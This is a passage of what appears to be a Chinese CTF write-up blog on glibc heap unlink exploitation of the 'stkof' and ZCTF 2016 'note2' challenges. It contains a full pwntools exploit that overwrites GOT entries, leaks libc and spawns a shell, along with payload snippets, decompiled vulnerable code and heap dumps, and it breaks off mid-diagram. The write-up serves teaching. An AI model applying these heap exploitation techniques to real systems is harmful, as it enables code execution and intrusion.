0x0</span><br><span class="line">&#125;</span><br><span class="line">0xe06010 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 81, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0xe06060 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 1041, </span><br><span class="line">  fd &#x3D; 0xa4b4f, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">…………</span><br></pre></td></tr></table></figure><h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>根据上面分析，我们在前面先分配一个 chunk 来把缓冲区分配完毕，以免影响之后的操作。</p><p>由于程序本身没有 leak，要想执行 system 等函数，我们的首要目的还是先构造 leak，基本思路如下：</p><ul><li>利用 unlink 修改 global[2] 为 &amp;global[2]-0x18。</li><li>利用编辑功能修改 global[0] 为 free@got 地址，同时修改 global[1] 为puts@got 地址，global[2] 为 &amp;global[2]-0x18 。</li><li>修改 <code>free@got</code> 为 <code>puts@plt</code> 的地址，从而当再次调用 <code>free</code> 函数时，即可直接调用 puts 函数。这样就可以泄漏函数内容。</li><li>free global[1]，即泄漏 puts@got 内容，从而知道 system 函数地址以及 libc 中 /bin/sh 地址。</li><li>修改 global[1] 为 /bin/sh 地址，修改 <code>free@got</code> 为 <code>system@got</code> 的地址，free chunk 1 即可。</li></ul><p>unlink 我们搞两个物理相邻的堆即可（2&amp;3），也不需要关心 chunk3  free 时会与 topchunk 合并，所以没有创建一个保护堆块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x48</span>)<span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x30</span>)<span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x80</span>)<span class="comment"># 3</span></span><br></pre></td></tr></table></figure><blockquote><p>最后 getshell 做法和 wiki 略有区别。</p></blockquote><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="built_in">globals</span> = <span class="number">0x0602140</span></span><br><span class="line">ptr = <span class="built_in">globals</span> + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x48</span>)<span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x30</span>)<span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x80</span>)<span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪造一个堆块；修改chunk3 size；</span></span><br><span class="line">payload0 = p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">payload0 += p64(ptr-<span class="number">0x18</span>) + p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">payload0 += p64(<span class="number">0x20</span>)</span><br><span class="line">payload0 = payload0.ljust(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload0 += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload0),payload0)</span><br><span class="line"><span class="comment"># 触发unlink</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改global指针表</span></span><br><span class="line">payload1 = <span class="string">&quot;skye&quot;</span>.ljust(<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload1 += p64(elf.got[<span class="string">&#x27;free&#x27;</span>])<span class="comment"># 0</span></span><br><span class="line">payload1 += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])<span class="comment"># 1</span></span><br><span class="line">payload1 += p64(<span class="built_in">globals</span>-<span class="number">0x8</span>)<span class="comment"># 2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload1),payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite free 2 puts</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\nOK\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;puts_addr:&quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base:&#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.success(<span class="string">&#x27;binsh_addr:&#x27;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">log.success(<span class="string">&#x27;system_addr:&#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改global指针表</span></span><br><span class="line">payload2 = <span class="string">&quot;skye&quot;</span>.ljust(<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload2 += p64(elf.got[<span class="string">&#x27;free&#x27;</span>])<span class="comment"># 0</span></span><br><span class="line">payload2 += p64(binsh_addr)<span class="comment"># 1</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload2),payload2)</span><br><span class="line"><span class="comment"># overwrite free 2 system</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(system_addr))</span><br><span class="line"><span class="comment"># gdb.attach(p,&#x27;b *0x0400919&#x27;)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016 ZCTF note2"></a>2016 ZCTF note2</h2><h3 id="基本信息-1"><a href="#基本信息-1" class="headerlink" title="基本信息"></a>基本信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">note2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked</span><br></pre></td></tr></table></figure><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>首先，我们先分析一下程序，可以看出程序的主要功能为</p><ul><li>添加 note，size 限制为 0x80，size 会被记录，note 指针会被记录。</li><li>展示 note 内容。</li><li>编辑 note 内容，其中包括覆盖已有的 note，在已有的 note 后面添加内容。</li><li>释放 note。</li></ul><p>仔细分析后，可以发现程序有以下几个问题</p><ol><li><p>在 create 时，程序会记录 note 对应的大小，该大小会用于控制读取 note 的内容。自定义函数中的循环变量 i 定义为 int 型，但是用于比较的传入参数定义是 unsigned int 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0LL</span>; length - <span class="number">1</span> &gt; i; ++i )          <span class="comment">// 预留最后一位写入\x00</span></span><br><span class="line">    <span class="comment">// 堆溢出：length为unsigned int，当length等于0时，结果是一个非常大整数</span></span><br><span class="line">&#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);                                 <span class="comment">// 读入错误退出程序</span></span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )                            <span class="comment">// 判断结束符</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + ptr) = buf;</span><br><span class="line">&#125;</span><br><span class="line">*(_BYTE *)(ptr + i) = <span class="number">0</span>;                      <span class="comment">// 写入结束符\x00</span></span><br><span class="line"><span class="keyword">return</span> i;</span><br></pre></td></tr></table></figure><p>在 C 语言中，我们用 int 和 unsigned int 两种数据类型进行运算时，会自动转换为 unsigned int，那么当我们输入 size 为 0 时，glibc 根据其规定，会分配 0x20 个字节，即：prez_size,size,fd,bk。因为 size 为 0 ，然后退出判断条件为：size-1 ，那么退出条件就恒满足，程序读取的长度就不受到限制，故而会产生堆溢出。</p></li><li><p>程序在每次编辑 note 时，都会申请 0xa0 大小的内存，但是在 free 之后并没有设置为 NULL，对做题没有影响。但是注意一下每次编辑时可输入的长度，是否能被利用。（后面有详解）</p></li></ol><h3 id="漏洞函数-1"><a href="#漏洞函数-1" class="headerlink" title="漏洞函数"></a>漏洞函数</h3><p>在编辑 create 时调用，存在写入长度可控，造成堆溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0LL</span>; length - <span class="number">1</span> &gt; i; ++i )          <span class="comment">// 预留最后一位写入\x00</span></span><br><span class="line">    <span class="comment">// 堆溢出：length为unsigned int，当length等于0时，结果是一个非常大整数</span></span><br><span class="line">&#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);                                 <span class="comment">// 读入错误退出程序</span></span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )                            <span class="comment">// 判断结束符</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + ptr) = buf;</span><br><span class="line">&#125;</span><br><span class="line">*(_BYTE *)(ptr + i) = <span class="number">0</span>;                      <span class="comment">// 写入结束符\x00</span></span><br><span class="line"><span class="keyword">return</span> i;</span><br></pre></td></tr></table></figure><p>造成原因前面有说，这里概述一下：length 为 unsigned int 当与 int 类型运算时，结果会被自动转换为 unsigned int ，那么 length - 1 就能产生一个巨大正数，从而无限输入。</p><p>还有一个地方就是 edit 功能。主要逻辑是创建一个 0xa0 的堆块，用来存放 tmp 数据、准备写入被修改 chunk 的数据，重点是**每次输入临时数据长度都是 0x90 **</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my_input((__int64)(v8 + <span class="number">15</span>), <span class="number">0x90</span>LL, <span class="number">10</span>);</span><br></pre></td></tr></table></figure><p>一开始看上去是存在溢出，假如 chunk size 为 0x80 ，就能溢出 0x90 ？不想多了，在调试后发现不会溢出的，因为有这一句话：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1[chunk_size - <span class="built_in">strlen</span>(&amp;dest) + <span class="number">14</span>] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>程序会在 chunk size 上限的地方写入一个 <code>\x00</code> ，从而避免了溢出。所以漏洞利用点就只有一个。</p><h3 id="基本思路-1"><a href="#基本思路-1" class="headerlink" title="基本思路"></a>基本思路</h3><p>这里我们利用发现的第一个问题，主要利用了 fastbin 的机制、unlink 的机制。</p><ol><li>创建 3 个堆块，chunk1 为 fastbin ，其余是 unsorted bin 。创建 chunk 0 写入数据时，将 fake chunk 也写入。</li><li>释放 chunk 1 ， 然后再次申请相同大小的 chunk ，由于 fastbin 机制，会使用原来 chunk 1 的地址。申请 size 为 0 ，触发漏洞修改 chunk 2 的 prez_size 和 prez_inuse 。</li><li>释放 chunk 2 触发 unlink hijack chunk list 指针列表。</li></ol><h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><p>首先，我们先把 note 可能的基本操作列举出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./note2&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./note2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newnote</span>(<span class="params">length, content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;(less than 128)&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shownote</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;note:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editnote</span>(<span class="params"><span class="built_in">id</span>, choice, s</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;note:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;2.append]&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deletenote</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;note:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br></pre></td></tr></table></figure><h4 id="生成三个-note"><a href="#生成三个-note" class="headerlink" title="生成三个 note"></a>生成三个 note</h4><p>构造三个 chunk，chunk0、chunk1 和 chunk2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)</span><br><span class="line">payload += p64(chunk_ptr-<span class="number">0x18</span>) + p64(chunk_ptr-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">newnote(<span class="number">0x80</span>,payload)</span><br><span class="line">newnote(<span class="number">0</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>其中这三个 chunk 申请时的大小分别为 0x80，0，0x80 。chunk1 虽然申请的大小为 0，但是 glibc 的要求 chunk 块至少可以存储 4 个必要的字段 (prev_size,size,fd,bk)，所以会分配 0x20 的空间。同时，由于无符号整数的比较问题，可以为该 note 输入任意长的字符串。</p><p>这里需要注意的是，chunk0 中一共构造了两个 chunk</p><ul><li>chunk ptr[0]，这个是为了 unlink 时修改对应的值。</li><li>chunk ptr[0]’s nextchunk，这个是为了使得 unlink 时的第一个检查满足。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br></pre></td></tr></table></figure><p>当构造完三个 note 后，堆的基本构造如图 1 所示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">                                   +-----------------+ high addr</span><br><span class="line">                                   |      ...        |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |      &#39;b&#39;*8      |</span><br><span class="line">                ptr[2]-----------&gt; +-----------------+</span><br><span class="line">                                   |    size&#x3D;0x91    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    prevsize     |</span><br><span class="line">                                   +-----------------|------------</span><br><span class="line">                                   |    unused       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    &#39;a&#39;*8        |</span><br><span class="line">                 ptr[1]----------&gt; +-----------------+  chunk 1</span><br><span class="line">                                   |    size&#x3D;0x20    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    prevsize     |</span><br><span class="line">                                   +-----------------|-------------</span><br><span class="line">                                   |    unused       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |   ……………………      |</span><br><span class="line">fake ptr[0] chunk&#39;s nextchunk-----&gt;+-----------------+</span><br><span class="line">                                   |   ……………………      |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    fakebk       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    fakefd       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    0xa1         |  chunk 0</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    0            |</span><br><span class="line">                 ptr[0]----------&gt; +-----------------+</span><br><span class="line">                                   |    size&#x3D;0x91    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    prev_size    |</span><br><span class="line">                                   +-----------------+  low addr</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x /40gx 0x603000</span></span><br><span class="line">0x603000:0x00000000000000000x0000000000000091</span><br><span class="line">0x603010:0x00000000000000000x00000000000000a1</span><br><span class="line">0x603020:0x00000000006021080x0000000000602110</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000000x0000000000000021</span><br><span class="line">0x6030a0:0x62626262626262620x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000000091</span><br><span class="line">0x6030c0:0x63636363636363630x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h4 id="释放-chunk1-覆盖-chunk2-释放-chunk2"><a href="#释放-chunk1-覆盖-chunk2-释放-chunk2" class="headerlink" title="释放 chunk1 - 覆盖 chunk2 - 释放 chunk2"></a>释放 chunk1 - 覆盖 chunk2 - 释放 chunk2</h4><p>对应的代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">newnote(<span class="number">0</span>,payload)</span><br><span class="line">deletenote(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(atoi_got)</span><br><span class="line">editnote(<span class="number">0</span>,<span class="number">1</span>,payload)</span><br><span class="line">shownote(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>首先释放 chunk1，由于该 chunk 属于 fastbin，所以下次在申请的时候仍然会申请到该 chunk，同时由于上面所说的类型问题，我们可以读取任意字符，所以就可以覆盖 chunk2，覆盖之后如图 2 所示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">                                   +-----------------+high addr</span><br><span class="line">                                   |      ...        |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |   &#39;\x00&#39;+&#39;b&#39;*7  |</span><br><span class="line">                ptr[2]-----------&gt; +-----------------+ chunk 2</span><br><span class="line">                                   |    size&#x3D;0x90    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    0xa0         |</span><br><span class="line">                                   +-----------------|------------</span><br><span class="line">                                   |    &#39;a&#39;*8        |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    &#39;a&#39;*8        